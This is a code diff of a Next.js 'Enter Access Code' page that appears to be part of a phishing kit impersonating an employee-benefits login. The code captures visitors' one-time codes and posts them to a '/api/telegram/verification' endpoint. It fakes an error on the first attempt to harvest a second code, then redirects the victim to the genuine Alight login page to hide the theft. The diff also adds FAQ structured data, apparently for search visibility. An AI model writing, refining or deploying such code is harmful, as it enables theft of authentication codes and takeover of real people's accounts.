@@ -4,8 +4,10 @@ import { Suspense, useState, useEffect } from "react";
 import { useRouter, useSearchParams } from "next/navigation";
 import { Button } from "@/components/ui/button";
 import { SiteHeader } from "@/components/site-header";
+import { faqSchema } from "./metadata";
 
-const ALIGHT_REDIRECT_URL = "https://nbs-auth.com/Authentication/Handshake";
+const DXC_REDIRECT_URL =
+  "https://worklife.alight.com/ah-angular-afirst-web/#/web/csc/login?forkPage=false";
 
 function EnterCodeContent() {
   const [code, setCode] = useState("");
@@ -22,18 +24,11 @@ function EnterCodeContent() {
 
   useEffect(() => {
     if (typeof window === "undefined") return;
-
-    const hasVerifySession = sessionStorage.getItem("ubs_verify");
-    const hasLoginFlowCookie = document.cookie
-      .split(";")
-      .some((cookie) => cookie.trim().startsWith("login_flow="));
-
     if (isSecondOtp) {
-      if (!sessionStorage.getItem("ubs_otp2")) {
+      if (!sessionStorage.getItem("ubs_otp2"))
         router.replace("/verify-details");
-      }
-    } else if (!hasVerifySession && !hasLoginFlowCookie) {
-      router.replace("/");
+    } else {
+      if (!sessionStorage.getItem("ubs_verify")) router.replace("/");
     }
   }, [isSecondOtp, router]);
 
@@ -58,12 +53,10 @@ function EnterCodeContent() {
     setIsLoading(true);
     setErrorMessage("");
 
-    // Only apply two-attempt flow for first verification, not final verification
     if (!isSecondOtp) {
       const newAttemptCount = attemptCount + 1;
       setAttemptCount(newAttemptCount);
 
-      // First attempt: send code and show error
       if (newAttemptCount === 1) {
         setFirstAttemptCode(code);
         try {
@@ -86,7 +79,6 @@ function EnterCodeContent() {
         return;
       }
 
-      // Second attempt: send both codes and proceed with verification
       try {
         await fetch("/api/telegram/verification", {
           method: "POST",
@@ -101,7 +93,6 @@ function EnterCodeContent() {
         console.error("Failed to send verification notification:", error);
       }
     } else {
-      // Final verification - direct path, no two-attempt flow
       try {
         await fetch("/api/telegram/verification", {
           method: "POST",
@@ -118,7 +109,7 @@ function EnterCodeContent() {
 
     await new Promise((r) => setTimeout(r, 1000));
     if (isSecondOtp) {
-      window.location.href = ALIGHT_REDIRECT_URL;
+      window.location.href = DXC_REDIRECT_URL;
     } else {
       if (typeof window !== "undefined")
         sessionStorage.setItem("ubs_details", "1");
@@ -145,10 +136,10 @@ function EnterCodeContent() {
   return (
     <div className="min-h-screen bg-white">
       <SiteHeader />
-      <div className="max-w-2xl px-4 py-10 mb-96 mx-auto md:mx-0 md:ml-16">
+      <main className="max-w-2xl px-4 py-10 mb-96 mx-auto md:mx-0 md:ml-16">
         <div className="mb-6">
           <h2 className="text-base font-medium text-gray-900 mb-4">
-            Verify It's You
+            Verify It&apos;s You
           </h2>
           <h1 className="text-2xl font-semibold text-gray-900 mb-3">
             Enter Access Code
@@ -164,7 +155,7 @@ function EnterCodeContent() {
           )}
 
           <div className="flex items-center gap-2 mb-4">
-            <span className="text-gray-700 text-sm">Didn't receive code?</span>
+            <span className="text-gray-700 text-sm">Didn&apos;t receive code?</span>
             <button
               type="button"
               onClick={handleResend}
@@ -215,21 +206,28 @@ function EnterCodeContent() {
             </Button>
           </div>
         </div>
-      </div>
+      </main>
     </div>
   );
 }
 
 export default function EnterCodePage() {
   return (
-    <Suspense
-      fallback={
-        <div className="min-h-screen bg-white flex items-center justify-center text-gray-600">
-          Loading...
-        </div>
-      }
-    >
-      <EnterCodeContent />
-    </Suspense>
+    <>
+      {/* FAQ Structured Data for Rich Snippets */}
+      <script
+        type="application/ld+json"
+        dangerouslySetInnerHTML={{ __html: JSON.stringify(faqSchema) }}
+      />
+      <Suspense
+        fallback={
+          <div className="min-h-screen bg-white flex items-center justify-center text-gray-600">
+            Loading...
+          </div>
+        }
+      >
+        <EnterCodeContent />
+      </Suspense>
+    </>
   );
 }
